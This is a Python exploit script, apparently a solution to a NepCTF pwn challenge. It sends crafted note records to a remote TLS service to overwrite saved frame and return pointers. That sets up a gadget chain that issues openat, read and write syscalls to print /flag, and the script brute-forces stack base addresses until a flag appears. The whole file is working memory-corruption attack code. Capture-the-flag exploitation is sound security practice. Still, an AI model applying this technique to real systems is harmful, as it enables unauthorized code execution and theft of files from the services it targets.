#!/usr/bin/env python3
import re
import socket
import ssl
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "cbn1x2pb-jzt4-ahg9-hg3o-6a5b174b31113-neptune.nepctf.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443

SYS_OPENAT = 56
SYS_READ = 63
SYS_WRITE = 64
AT_FDCWD = 0xFFFFFF9C
TRAP0 = 0x2BA08
RESTART = 0x21168
BSS = 0x4BD88


def pack32(buf, off, val):
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def build_note(base, sysno, r0, r1, r2, with_flag=False):
    note = bytearray(64)
    # trap0 gadget loads R5..R0,R6 from [R30-0x34]..[R30-0x1c].
    # We set R30 = base + 0x38, so these land at note[4..28].
    for off, val in ((4, 0), (8, 0), (12, 0), (16, r2), (20, r1), (24, r0), (28, sysno)):
        pack32(note, off, val)
    if with_flag:
        note[32:38] = b"/flag\x00"
    # First dealloc_return: R30 = base+0x38, R31 = TRAP0.
    # trap0 epilogue dealloc_return: R30 = base+0x38, R31 = RESTART.
    pack32(note, 48, base + 0x38)
    pack32(note, 52, TRAP0)
    pack32(note, 56, base + 0x38)
    pack32(note, 60, RESTART)
    return bytes(note)


def payload_for(base):
    b1, b2, b3 = base, base - 0x80, base - 0x100
    return b"".join((
        b"3\n", build_note(b1, SYS_OPENAT, AT_FDCWD, b1 + 32, 0, True),
        b"3\n", build_note(b2, SYS_READ, 3, BSS, 0x100),
        b"3\n", build_note(b3, SYS_WRITE, 1, BSS, 0x100),
        b"5\n",
    ))


def run(base):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with ctx.wrap_socket(socket.socket(), server_hostname=HOST) as s:
        s.settimeout(8)
        s.connect((HOST, PORT))
        try:
            s.recv(4096)
        except Exception:
            pass
        s.sendall(payload_for(base))
        data = b""
        s.settimeout(8)
        while True:
            try:
                chunk = s.recv(4096)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
        return data


def main():
    # Locally (same qemu build) note[0] is read at 0x4080e510, then -0x80 per restart.
    candidates = [0x4080E510]
    # Some runners differ by stack size/reserved VA; try near known alignments if needed.
    for center in [0x4080E510, 0x4020E510, 0x4080E500, 0x15D6E500, 0x0B2BE500, 0x05D6E500]:
        for off in range(-0x80, 0x90, 0x10):
            v = center + off
            if v not in candidates:
                candidates.append(v)

    for base in candidates:
        print(f"[*] trying base 0x{base:08x}", flush=True)
        data = run(base)
        text = data.decode(errors="replace")
        hits = re.findall(rb"(?:[A-Za-z0-9_]+)?\{[^}\r\n]{1,120}\}|\{[A-Za-z0-9_!@#$%^&*+=:;,.?/\\-]{3,120}\}", data)
        if hits:
            print(text)
            for h in hits:
                print("[+] FLAG", h.decode(errors="replace"))
            return
        if b"calibration data recorded" in data and len(data) > 300:
            print(text[-800:])
    print("[-] no flag found")


if __name__ == "__main__":
    main()
